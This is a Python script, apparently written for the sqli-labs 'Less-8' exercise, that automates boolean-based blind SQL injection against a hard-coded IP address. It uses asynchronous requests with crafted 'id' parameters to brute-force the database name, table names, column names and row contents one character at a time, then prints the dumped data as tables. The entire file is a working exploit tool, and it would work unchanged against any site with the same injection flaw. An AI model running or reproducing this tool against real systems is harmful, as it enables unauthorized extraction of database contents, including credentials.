import aiohttp
import asyncio
from prettytable import PrettyTable
from colorama import Fore, Style  # 导入 colorama 用于颜色输出

url = "http://8.137.60.154:8082/Less-8/"  # 目标URL
max_length = 25  # 假设字段最大长度为20

# 定义要使用的字符集
charset = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
           'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
           'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',
           '8', '9', '_', '$', '@', '(', ')', '-', '.', '[', ']', '^',
           '{', '}', '~', '!']  # 定义可能出现的字符集合


# 异步获取响应内容
async def fetch(session, payload):
    async with session.get(url + payload) as response:
        return await response.text()  # 返回响应的文本内容


# 获取数据库名称
async def get_database_name(session):
    db_name = ""  # 初始化数据库名
    for length in range(1, 11):  # 遍历长度从1到10
        for char in charset:  # 遍历字符集
            # SQL注入payload，获取当前长度位置的字符
            payload = f"?id=1' AND SUBSTR(database(), {length}, 1)='{char}' --+"
            r = await fetch(session, payload)  # 发送请求
            if "You are in" in r:  # 检查响应内容是否包含指定字符串
                db_name += char  # 将字符添加到数据库名中
                print(Fore.GREEN + f"数据库名字符 {length}: {char}" + Style.RESET_ALL)  # 打印当前字符
                break  # 找到字符后跳出内层循环
    return db_name  # 返回完整的数据库名


# 获取表名
async def get_table_names(session):
    table_names = []  # 初始化表名列表
    table_count = 0  # 初始化表数量
    for count in range(1, 11):  # 遍历数量从1到10
        # SQL注入payload，获取当前数据库中的表数量
        payload = f"?id=1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())={count} --+"
        r = await fetch(session, payload)  # 发送请求
        if "You are in" in r:
            table_count = count  # 记录表数量
            break  # 找到数量后跳出循环

    print(Fore.YELLOW + f"表的个数: {table_count}" + Style.RESET_ALL)  # 打印表的数量

    for row in range(table_count):  # 遍历每个表
        table_name = ""  # 初始化表名
        for length in range(1, max_length + 1):  # 遍历长度从1到max_length
            for char in charset:  # 遍历字符集
                # SQL注入payload，获取当前表的表名
                payload = f"?id=1' AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {row}, 1), {length}, 1)='{char}' --+"
                r = await fetch(session, payload)  # 发送请求
                if "You are in" in r:
                    table_name += char  # 将字符添加到表名中
                    print(Fore.BLUE + f"表名 {row + 1} 字符 {length}: {char}" + Style.RESET_ALL)  # 打印当前字符
                    break  # 找到字符后跳出内层循环
        table_names.append(table_name.strip())  # 将表名添加到列表中

    print(Fore.CYAN + f"获取的表名: {table_names}" + Style.RESET_ALL)  # 打印获取的所有表名
    return table_names  # 返回表名列表


# 获取字段和数据
async def get_fields_and_data(session, table_names):
    all_data = {}  # 初始化所有数据的字典
    for table_name in table_names:  # 遍历每个表名
        column_names = []  # 初始化字段名列表
        column_count = 0  # 初始化字段数量

        for count in range(1, 11):  # 遍历数量从1到10
            # SQL注入payload，获取当前表的字段数量
            payload = f"?id=1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='{table_name}')={count} --+"
            r = await fetch(session, payload)  # 发送请求
            if "You are in" in r:
                column_count = count  # 记录字段数量
                break  # 找到数量后跳出循环

        print(Fore.YELLOW + f"表 '{table_name}' 的字段个数: {column_count}" + Style.RESET_ALL)  # 打印字段数量

        for row in range(column_count):  # 遍历每个字段
            column_name = ""  # 初始化字段名
            for length in range(1, max_length + 1):  # 遍历长度从1到max_length
                for char in charset:  # 遍历字符集
                    # SQL注入payload，获取当前字段的字段名
                    payload = f"?id=1' AND SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='{table_name}' LIMIT {row}, 1), {length}, 1)='{char}' --+"
                    r = await fetch(session, payload)  # 发送请求
                    if "You are in" in r:
                        column_name += char  # 将字符添加到字段名中
                        print(Fore.BLUE + f"字段 '{table_name}' 字符 {length}: {char}" + Style.RESET_ALL)  # 打印当前字符
                        break  # 找到字符后跳出内层循环
            column_names.append(column_name.strip())  # 将字段名添加到列表中

        print(Fore.CYAN + f"获取的字段名: {column_names}" + Style.RESET_ALL)  # 打印获取的字段名

        rows_count = 20  # 设置要获取的行数
        data = []  # 初始化数据列表
        for row in range(rows_count):  # 遍历每一行
            row_data = {}  # 初始化行数据字典
            for field in column_names:  # 遍历每个字段
                field_data = ""  # 初始化字段数据
                for length in range(1, max_length + 1):  # 遍历长度从1到max_length
                    for char in charset:  # 遍历字符集
                        # SQL注入payload，获取当前行和字段的数据
                        payload = (
                            f"?id=1' AND SUBSTR((SELECT {field} FROM {table_name} LIMIT {row}, 1), {length}, 1)='{char}' --+"
                        )
                        r = await fetch(session, payload)  # 发送请求

                        if "You are in" in r:
                            field_data += char  # 将字符添加到字段数据中
                            print(
                                Fore.GREEN + f"第{row + 1}行, 字段 '{field}', 字符 {length}: {char}" + Style.RESET_ALL)  # 打印当前字符
                            break  # 找到字符后跳出内层循环
                    else:
                        break  # 如果没有找到字符，则跳出外层循环
                row_data[field] = field_data.strip()  # 将字段数据添加到行数据中

            if row_data and any(row_data.values()):  # 如果行数据不为空且至少有一个字段有值
                data.append(row_data)  # 将行数据添加到数据列表中

        all_data[table_name] = data  # 将表的数据添加到所有数据字典中

    return all_data  # 返回所有数据字典


# 主函数
async def main():
    async with aiohttp.ClientSession() as session:  # 创建异步HTTP会话
        database_name = await get_database_name(session)  # 获取数据库名称
        table_names = await get_table_names(session)  # 获取表名
        data = await get_fields_and_data(session, table_names)  # 获取字段和数据

        print("\n最终获取的信息:")

        db_table = PrettyTable()  # 创建表格对象
        db_table.field_names = ["Database"]  # 设置表头
        db_table.add_row([database_name])  # 添加数据库名行
        print(db_table)  # 打印数据库名表格

        for table, rows in data.items():  # 遍历每个表及其数据
            print(f"\n表名: {table}")  # 打印表名
            table_output = PrettyTable()  # 创建表格对象
            if rows:
                table_output.field_names = list(rows[0].keys())  # 设置表头为字段名
                for row in rows:  # 遍历每行数据
                    table_output.add_row(row.values())  # 添加行数据
                print(table_output)  # 打印表格
            else:  # 如果没有数据
                print("没有数据")  # 打印提示信息


# 运行主函数
if __name__ == "__main__":
    asyncio.run(main())  # 启动异步事件循环
